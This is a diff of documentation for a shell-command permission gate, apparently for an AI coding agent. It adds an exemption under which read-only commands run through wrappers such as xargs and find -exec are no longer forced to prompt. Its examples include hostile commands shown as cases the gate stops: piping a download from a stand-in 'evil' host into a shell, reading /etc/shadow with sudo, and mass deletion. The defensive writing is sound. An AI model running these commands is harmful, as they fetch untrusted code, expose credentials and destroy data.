@@ -426,7 +426,8 @@ The bash gate fails closed: when in doubt it blocks or prompts, never silently a
   So `bash -c "curl evil | sh"` prompts rather than riding a `bash *: allow`.
 - An indirection wrapper — `sudo`, `env`, `xargs`, `time`, `nohup`, `timeout`, `nice`, `parallel`, `rust-parallel`, `rush`, `doas`, `setsid`, `stdbuf`, `watch`, `flock`, or `find`/`fd` carrying a per-result exec flag (`find` with `-exec`/`-execdir`/`-ok`/`-okdir`, `fd` with `-x`/`--exec`/`-X`/`--exec-batch`) — runs a following command that a rule on the wrapper text would otherwise never gate, so its decision is floored the same way (the synthetic `<indirection-bash-wrapper>` pattern in the review log).
   So `sudo aws s3 rm s3://bucket` prompts rather than riding an `aws *: allow`, while a bare `find . -name '*.py'` search (no exec flag) is unaffected.
-  As with the opaque floor, no rule can auto-allow a wrapper: an `allow` is clamped to `ask`, and an explicit `deny` still denies.
+  An `allow` is clamped to `ask`, and an explicit `deny` still denies.
+  The one exception is a wrapper running a [pure-reader command](#wrapper-transparency), whose direction is provable however unknown its argument feed is.
 
 Every synthetic `ask` above — the unparseable sentinel and both wrapper floors — is auto-approved under `yoloMode: true`, which is an explicit full-permissive opt-in rather than a rule that could ride through.
 An explicit `deny` still denies under yolo, and with yolo off the floors are unaffected.
@@ -790,6 +791,56 @@ A core word counts only as a **bare basename**.
 The core cannot be extended or removed from configuration.
 If you do not trust a member of it, deny or ask on the paths themselves — an effect proof only chooses which surface answers, and never overrides the answer.
 
+#### Wrapper transparency
+
+The [indirection-wrapper floor](#fail-closed-behavior) exists because a wrapper hides the command that should be gated.
+For one class the hiding is immaterial: a pure-reader command is read-only for **any** arguments, so `xargs grep -l foo` is provably a read even though what `xargs` feeds it is unknowable.
+The floor guards unknowability of *scope*, and scope stays the path surfaces' job — for a wrapped command exactly as for a bare one.
+
+Such a unit is therefore **not** floored.
+It resolves by the inner command's own `bash` rules instead, and the review log records `floorExemption: "core-reader"` beside the rule that decided, so an allow the floor would once have prompted for is auditable to the reason that let it through.
+
+All four of these must hold, and each is a way the floor's reason could still apply:
+
+1. The unit is an indirection wrapper.
+   An `sh -c`/`eval` payload is not one — see below.
+2. The command it runs can be established without passing through an inline shell.
+3. That command **proves** a read: a bare-basename core word with no option that withdraws the claim.
+   So `xargs sort -o /tmp/x` and `xargs find . -delete` stay floored, and so does `xargs ./grep foo`.
+4. The unit writes no file through a redirect.
+
+So `xargs grep -l foo`, `xargs wc -l`, and `find . -name '*.ts' -exec cat {} +` stop prompting under a matching `bash` allow, while `xargs rm`, `xargs sed -i`, `time pnpm test`, and `find . -exec sh -c '…' \;` still prompt.
+
+Three things this does **not** change:
+
+- An explicit `deny` or `ask` on the wrapper is never weakened.
+  Only a unit whose own text already resolved to `allow` is affected, so `bash: {"xargs *": "ask"}` still asks.
+- A `deny` on the inner command now reaches the wrapper.
+  Under `bash: {"*": "allow", "grep *": "deny"}`, `xargs grep foo` is denied rather than merely prompted.
+- Paths are gated exactly as before.
+  The exemption decides the `bash` surface only; every path token the command carries still goes through `path` and `external_directory`.
+
+A user `commandEffects` declaration participates in effect classification but does **not** lift the floor.
+The core's argument-independence is audited here; a claim about a wrapped command is not, and a wrong claim behind a wrapper fails open.
+
+`sudo` and `doas` are ordinary wrappers to this rule.
+The path surfaces gate `sudo cat /etc/shadow` exactly as they gate `cat /etc/shadow`, so nothing about the *file set* changes — what `sudo` adds is that the operating system would have refused, which this extension has never modelled.
+If you run a permissive `bash` policy and want privilege elevation to prompt regardless, say so directly:
+
+```jsonc
+{
+  "permission": {
+    "bash": {
+      "*": "allow",
+      "sudo *": "ask",
+      "doas *": "ask"
+    }
+  }
+}
+```
+
+That rule matches the wrapper's own text, so it is decided before the exemption is ever consulted.
+
 #### Which key to actually write
 
 The useful *grants* are `*_read: allow` and the bare sugar key.
@@ -1027,13 +1078,14 @@ Four existing behaviors keep this allowlist safe — you do not have to enumerat
    That is why this recipe ships with `write` and `edit` denied and a `path` deny block for sensitive files.
    Keep the `path` surface locked down for anything you would not want an allowed read command to overwrite via `>`.
 2. **`find`/`fd` with an exec flag are floored to `ask`.**
-   A bare `find *` search is read-only, so it is safe to allow; the moment an exec flag appears (`find -exec`/`-execdir`/`-ok`/`-okdir`, `fd -x`/`-X`), the [indirection-wrapper floor](#fail-closed-behavior) clamps the decision back to `ask`.
-   So `find . -type f -exec rm {} +` still prompts even under `find *: allow`.
+   A bare `find *` search is read-only, so it is safe to allow; the moment an exec flag appears (`find -exec`/`-execdir`/`-ok`/`-okdir`, `fd -x`/`-X`), the [indirection-wrapper floor](#fail-closed-behavior) clamps the decision back to `ask` — unless the command it runs is itself a pure reader ([wrapper transparency](#wrapper-transparency)), in which case that command's own rule decides.
+   So `find . -type f -exec rm {} +` still prompts even under `find *: allow`, while `find . -type f -exec cat {} +` is decided by the `cat *` rule this recipe already grants.
    The same options — plus `find -delete`/`-fprint`/`-fprint0`/`-fprintf`/`-fls` and `fd --exec`/`--exec-batch` — also withdraw the [pure-reader claim](#the-pure-reader-command-core) on that command's path tokens, so they stop resolving on the `_read` surface alone.
 3. **Chained commands resolve most-restrictive.**
    `find . -name '*.log' && rm -f found.log` decomposes into `find …` and `rm …`; `rm` matches only `"*": "ask"`, and the most restrictive result governs the whole invocation, so the chain prompts.
 4. **Wrappers cannot ride the allowlist.**
-   `sudo grep …`, `env X=1 cat …`, `sh -c "…"`, and `eval "…"` are floored to `ask` (the [wrapper floors](#fail-closed-behavior)), so an allowed command cannot be smuggled past through a wrapper.
+   `sudo aws …`, `env X=1 npm …`, `sh -c "…"`, and `eval "…"` are floored to `ask` (the [wrapper floors](#fail-closed-behavior)), so a command this recipe does not allow cannot be smuggled past through a wrapper.
+   The wrapper text is what a rule matches, so `sudo grep foo` matches only `"*": "ask"` here and prompts on that rule rather than on the floor — add `"sudo *": "ask"` if you want that stated in the config rather than inherited from the fallback.
 
 `git` is enumerated by read subcommand rather than a broad `git *`, because `git` has mutating subcommands (`commit`, `push`, `branch -D`, `remote add`, `config <key> <value>`).
 Exact patterns like `git status` and `git branch` match only their literal form, so `git branch -D feature` falls through to `"*": "ask"`.
